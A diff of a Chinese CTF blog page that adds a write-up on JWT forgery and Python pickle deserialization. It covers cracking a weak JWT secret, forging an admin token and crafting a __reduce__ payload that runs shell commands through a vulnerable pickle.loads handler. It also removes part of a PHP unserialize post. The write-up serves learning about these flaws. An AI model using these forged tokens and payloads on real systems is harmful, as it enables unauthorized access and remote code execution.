@@ -169,6 +169,153 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-JWT以及python反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/14/JWT%E4%BB%A5%E5%8F%8Apython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2021-09-13T16:00:00.000Z" itemprop="datePublished">2021-09-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/14/JWT%E4%BB%A5%E5%8F%8Apython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        JWT以及python反序列化
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JWT以及python反序列化"><a href="#JWT以及python反序列化" class="headerlink" title="JWT以及python反序列化"></a>JWT以及python反序列化</h1><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JWT，全称JSON Web Token，它是作为JSON对象在各方之间安全传输信息，该信息可以被验证和信任</p>
+<h3 id="JWT的使用场景"><a href="#JWT的使用场景" class="headerlink" title="JWT的使用场景"></a>JWT的使用场景</h3><p>授权(Authorization)：每个请求都会带有JWT，让其用户有允许访问特殊的路由、服务和资源的令牌</p>
+<p>信息交换(Information Exchange)：对于安全的在各方之间传输信息而言，JWT是很好的选择，因为JWT是有使用公钥/私钥签名的，而这个签名主要针对使用头和负载计算机，可以验证内容没有篡改</p>
+<h3 id="JWT构成"><a href="#JWT构成" class="headerlink" title="JWT构成"></a>JWT构成</h3><p>JWT由三部分构成，分别是header、payload、signature</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header.payload.signature</span><br></pre></td></tr></table></figure>
+<h4 id="header部分"><a href="#header部分" class="headerlink" title="header部分"></a>header部分</h4><p>header由两部分构成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">token的类型，如：&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line"></span><br><span class="line">算法名称，如：&quot;alg&quot;:&quot;HS256&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后用base64来进行加密，得到JWT的第一部分</p>
+<h4 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h4><p>payloay包含声明，声明是用户和其它数据的声明，有三种类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">registered claims：预定义声明，不是强制的</span><br><span class="line"></span><br><span class="line">public claims：可以随意定义</span><br><span class="line"></span><br><span class="line">private claims：用于在同意使用它们的各方之间共享信息，不是公开的声明</span><br></pre></td></tr></table></figure>
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;sub&quot;:&quot;1234567&quot;,</span><br><span class="line">	&quot;name&quot;:&quot;admds&quot;,</span><br><span class="line">	&quot;admin&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后对payload进行base64加密，成为JWT的第二部分</p>
+<h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>Signature是一个签名，用来验证消息在传递过程中是否有篡改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方</p>
+<p>它的加密原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>
+<p>其中的secret是私钥，一般会在注册登录的时候获得JWT，作为一个用户凭证</p>
+<h3 id="JWT的工作过程"><a href="#JWT的工作过程" class="headerlink" title="JWT的工作过程"></a>JWT的工作过程</h3><p>当用户要访问受保护的资源的时候，则需要注册和登录，而就在这个过程中，用户会向授权服务器发出请求，授权服务器发出请求后，会返回一个JWT作为用户的凭证来访问受保护的资源，而JWT中的签名是用私钥加密的，提高了安全性</p>
+<p>因此，如果我们伪造jwt的话，需要知道授权服务器的私钥，所以我们可以使用工具对私钥进行爆破，使用c-jwt-cracker，建议在ubuntu进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c-jwt-cracker：https://github.com/brendan-rius/c-jwt-cracker</span><br></pre></td></tr></table></figure>
+<p>然后修改JWT的内容，再用获得的私钥进行加密，可以使用这个网站(<a target="_blank" rel="noopener" href="https://jwt.io/)%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC">https://jwt.io/)，也可以使用脚本</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">token_dict = &#123;</span><br><span class="line">    &quot;username&quot;:&quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line">#headers</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 调用jwt库,生成json web token</span><br><span class="line">jwt_token = jwt.encode(token_dict,  # payload</span><br><span class="line">                       &quot;1Kun&quot;,  # 进行加密签名的密钥</span><br><span class="line">                       algorithm=&quot;HS256&quot;,  # 指明签名算法方式,默认S256</span><br><span class="line">                       headers=headers  # headers</span><br><span class="line">                       ).encode(&#x27;ascii&#x27;).decode(&#x27;ascii&#x27;)  # 把py3得到的byte转码</span><br><span class="line"></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
+<p>JWT详细可看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
+<h2 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h2><p>python反序列化使用pickle库以及函数来进行序列化，和php的serialize和unserialize作用一样</p>
+<h3 id="Pickle库以及函数"><a href="#Pickle库以及函数" class="headerlink" title="Pickle库以及函数"></a>Pickle库以及函数</h3><p>pickle库让python可以实现序列化和反序列化，而它会将二进制形式的序列化保存在文件中，后缀为.pkl，但是文件不能直接打开预览，其中反序列化和序列化的函数有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dumps：对象序列化为bytes对象</span><br><span class="line"></span><br><span class="line">dump：对象序列化到文件对象，存入文件</span><br><span class="line"></span><br><span class="line">loads：从bytes对象反序列化</span><br><span class="line"></span><br><span class="line">load：对象反序列化，从文件中读取数据</span><br></pre></td></tr></table></figure>
+
+<h4 id="dump-load"><a href="#dump-load" class="headerlink" title="dump/load"></a>dump/load</h4><p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">#序列化</span><br><span class="line">pickle.dump(obj, file, protocol=None,)</span><br><span class="line">obj表示要进行封装的对象(必填参数）</span><br><span class="line">file表示obj要写入的文件对象</span><br><span class="line">以二进制可写模式打开即wb(必填参数）</span><br><span class="line">#反序列化</span><br><span class="line">pickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;, buffers=None)</span><br><span class="line">file文件中读取封存后的对象</span><br><span class="line">以二进制可读模式打开即rb(必填参数)</span><br></pre></td></tr></table></figure>
+<p>看这串代码，我们可以知道dump函数以及load()函数的流程，就是用dump()函数将数据进行序列化，然后将序列化后得到的数据写入到一个文件中，然后load()函数读取文件，并将里面的数据进行反序列化</p>
+<h4 id="dumps-loads"><a href="#dumps-loads" class="headerlink" title="dumps/loads"></a>dumps/loads</h4><p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">#序列化</span><br><span class="line">pickle.dumps(obj, protocol=None,*,fix_imports=True)</span><br><span class="line">dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。</span><br><span class="line">#反序列化</span><br><span class="line">pickle.loads(bytes_object, *,fix_imports=True, encoding=&quot;ASCII&quot;. errors=&quot;strict&quot;)</span><br><span class="line">loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。</span><br></pre></td></tr></table></figure>
+
+<p>我们可以知道dumps/loads的操作流程，即dumps()函数将数据进行序列化，并返回一个bytes对象出来，然后loads()函数直接从bytes对象中读取序列化的信息，然后进行反序列化即可，无需写入读取文件</p>
+<h3 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h3><p>对于python而言，python运行源码，是python解释器将源码编译成字节码，然后将字节码转发到python虚拟机中执行，即PVM就是用来解释字节码的引擎</p>
+<h4 id="PVM执行流程"><a href="#PVM执行流程" class="headerlink" title="PVM执行流程"></a>PVM执行流程</h4><p>首先PVM将源码编译成字节码，然后PVM再将字节码转发到python虚拟机中执行，不过两个阶段PVM不同，第一个是python解释器，第二个是python虚拟机</p>
+<h4 id="PVM与Pickle库的关系"><a href="#PVM与Pickle库的关系" class="headerlink" title="PVM与Pickle库的关系"></a>PVM与Pickle库的关系</h4><p>Pickle是一门基于栈的编程语言，本质是一个轻量的PVM，它由三部分构成</p>
+<p>指令处理器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从数据流中读取操作码和参数，并对其进行解释处理，在循环执行过程中会不改变stack和memo区域的值，直到遇到.这个结束符号</span><br></pre></td></tr></table></figure>
+
+<p>栈区（stack）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">作为流数据处理过程中的暂存区，在不断进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果</span><br></pre></td></tr></table></figure>
+
+
+<p>标签区（medo）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看作是数据索引或者标记，即将反序列化完成的数据以key-value的形式存储在medo中</span><br></pre></td></tr></table></figure>
+
+<p>指令处理器的操作码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c：读取本行的内容作为模块名，读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中</span><br><span class="line"></span><br><span class="line">(：将一个标记对象压入到栈中，用于确定命令执行的位置，该标志一般和t指令一起使用，从而产生一个元组</span><br><span class="line"></span><br><span class="line">S : 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中</span><br><span class="line"></span><br><span class="line">t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中</span><br><span class="line"></span><br><span class="line">R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中</span><br><span class="line"></span><br><span class="line">. : 结束整个 Pickle 反序列化过程</span><br></pre></td></tr></table></figure>
+<h4 id="Pickle-CPickle反序列化漏洞"><a href="#Pickle-CPickle反序列化漏洞" class="headerlink" title="Pickle/CPickle反序列化漏洞"></a>Pickle/CPickle反序列化漏洞</h4><p>python反序列化漏洞一般出现在__reduce__()函数中，它会在dumps/dump()函数进行序列化时，自动调用这个__reduce__()函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__reduce__()</span><br><span class="line"></span><br><span class="line">当__reduce__()函数返回一个元组时，第一个元素为可调用对象，这个对象会在创建对象时被调用，第二个元素时可调用对象的参数，同样是一个元组。它的功能和PVM的R操作码功能相似</span><br></pre></td></tr></table></figure>
+<p>其实，R操作码就是__reduce__()函数的底层实现，在序列化快结束时，python进程会自动调用__reduce__()方法，所以如果我们可以控制被调用函数的参数，就可以执行恶意代码</p>
+<h5 id="反序列化漏洞出现位置"><a href="#反序列化漏洞出现位置" class="headerlink" title="反序列化漏洞出现位置"></a>反序列化漏洞出现位置</h5><ol>
+<li><p>解析认证token、session的时候</p>
+</li>
+<li><p>将对象Pickle后存储在磁盘文件</p>
+</li>
+<li><p>将对象Pickle后在网络中传输</p>
+</li>
+<li><p>参数传递给程序</p>
+</li>
+</ol>
+<h6 id="执行恶意代码的实例"><a href="#执行恶意代码的实例" class="headerlink" title="执行恶意代码的实例"></a>执行恶意代码的实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#模仿Epicccal师傅的例子</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Test2(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">    	#被调用函数的参数</span><br><span class="line">        cmd = &quot;/usr/bin/id&quot; </span><br><span class="line">        return (os.system,(cmd,))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    test = Test2()</span><br><span class="line">    #执行序列化操作</span><br><span class="line">    result1 = pickle.dumps(test)</span><br><span class="line">    #执行反序列化操作</span><br><span class="line">    result2 = pickle.loads(result1)</span><br><span class="line"></span><br><span class="line"># __reduce__()魔法方法的返回值:</span><br><span class="line"># return(os.system,(cmd,))</span><br><span class="line"># 1.满足返回一个元组，元组中有两个参数</span><br><span class="line"># 2.第一个参数是被调用函数 : os.system()</span><br><span class="line"># 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd</span><br><span class="line"># 4. 因此反序列化时被解析执行的代码是 os.system(&quot;/usr/bin/id&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>但我们打开页面时，发现是一个购物的界面，下面有一个提示就是找到lv6，所以我们可以写一个脚本，来找到有lv6的页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://7d7dae3b-0ab3-41da-ade2-10a524bf05a3.node4.buuoj.cn:81/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(2000):</span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    if &#x27;lv6.png&#x27; in r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p>发现lv6后，打开购买界面，发现它的购买金额已经大于我们的钱袋里的钱，但是有优惠金额，所以我们可以抓包，然后修改优惠金额，让我们可以买到，修改后却说不是admin用户用不了，然后看到包里有JWT这个验证信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644</span><br></pre></td></tr></table></figure>
+<p>因此，我是用c-jwt-cracker爆破出密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1Kun</span><br></pre></td></tr></table></figure>
+<p>然后修改JWT中payload的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用<a target="_blank" rel="noopener" href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%BC%AA%E9%80%A0%E4%B8%80%E4%B8%AAJWT%EF%BC%8C%E6%94%BE%E8%BF%9B%E5%8C%85%E9%87%8C%EF%BC%8C%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AA%E6%AC%BA%E9%AA%97%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E5%85%A5%E5%88%B0%E4%B8%80%E4%B8%AA%E4%B8%80%E9%94%AE%E6%88%90%E4%B8%BA%E5%A4%A7%E4%BC%9A%E5%91%98%E7%9A%84%E7%95%8C%E9%9D%A2%E3%80%82%E4%B9%8B%E5%90%8E%E6%89%93%E5%BC%80%E9%A1%B5%E9%9D%A2%E6%BA%90%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2www.zip">https://jwt.io/这个网站伪造一个JWT，放进包里，进行一个欺骗，然后进入到一个一键成为大会员的界面。之后打开页面源码，发现有源码泄露www.zip</a></p>
+<p>得到源码后，由于我们当前的页面是admin的，所以我们打开y源码文件中的Admin.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br></pre></td></tr></table></figure>
+<p>可以看见一处python反序列化漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">           become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">           p = pickle.loads(urllib.unquote(become))</span><br><span class="line">           return self.render(&#x27;form.html&#x27;, res=p, member=1) #找到模板文件，进行渲染，从而显示页面</span><br></pre></td></tr></table></figure>
+<p>而self.get_argument(‘become’)是获取become参数的值，我们只要点击一键成为大会员，然后抓包就可以看见这个become参数。根据代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>
+<p>我们要输入一串序列化的字符串进行，让它进行读取，前面提到了__reduce__()方法，可以执行恶意代码，而这里也没有什么过滤，所以可以直接构造序列化信息，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf8</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">import commands</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (commands.getoutput,(&#x27;ls /&#x27;,))</span><br><span class="line">        # return (eval,(open(&#x27;flag.txt&#x27;).read(),))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line">print urllib.quote(pickle.dumps(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>commands.getoutput()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以获取程序执行后的返回值和输出</span><br></pre></td></tr></table></figure>
+
+<p>eval()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php中是将参数当作php代码执行，而在python是将参数当作是表达式执行，并返回结果</span><br></pre></td></tr></table></figure>
+
+<p>详细可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/108919605">https://blog.csdn.net/qq_43431158/article/details/108919605</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-lsb最低位解密usb流量取证分析" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -910,85 +1057,6 @@ __destruct()--------------------在类的对象被销毁之前被调用
 <p>}<br>//很明显：<br>//这里的属性$p可以触发，__invoke()魔术方法，所以只要给$p赋值为Modifier类的对象即可</p>
 <p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a=new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}</p>
 <p>```<br>最后会回显base64码</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-绕过数组长度的反序列化" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/07/%E7%BB%95%E8%BF%87%E6%95%B0%E7%BB%84%E9%95%BF%E5%BA%A6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
-  	<time datetime="2021-09-06T16:00:00.000Z" itemprop="datePublished">2021-09-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/07/%E7%BB%95%E8%BF%87%E6%95%B0%E7%BB%84%E9%95%BF%E5%BA%A6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        绕过数组长度的反序列化
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="绕过数组长度的反序列化"><a href="#绕过数组长度的反序列化" class="headerlink" title="绕过数组长度的反序列化"></a>绕过数组长度的反序列化</h1><p>strlen()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">作用：如果成功则返回字符串的长度，如果字符串为空则返回0</span><br><span class="line"></span><br><span class="line">适合版本：php4+</span><br><span class="line"></span><br><span class="line">注意：在php 5.3.0之前，该函数将数组当作字符串，因此返回的长度为5，并产生一个E_NOTICE级别错误，但是之后版本的php，遇到数组会返回null</span><br></pre></td></tr></table></figure>
-
-<p>打开页面，我们可以看见登陆页面，此时我们可能会习惯性的sql注入，但发现不行，然后我们根据经验，猜测会有注册界面，而登录界面一般是register.php，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/register.php</span><br></pre></td></tr></table></figure>
-<p>发现注册界面，所以我们注册并登录，发现有信息填写，所以我们可以想想是不是源码泄露，所以可以用dirsearch扫描，但要控制线程，不要太快，发现<a target="_blank" rel="noopener" href="http://www.zip泄露/">www.zip泄露</a></p>
-<p>得到源码后，我们先看updata.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">		if(!preg_match(&#x27;/^\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">			die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">			die(&#x27;Invalid email&#x27;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">		if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 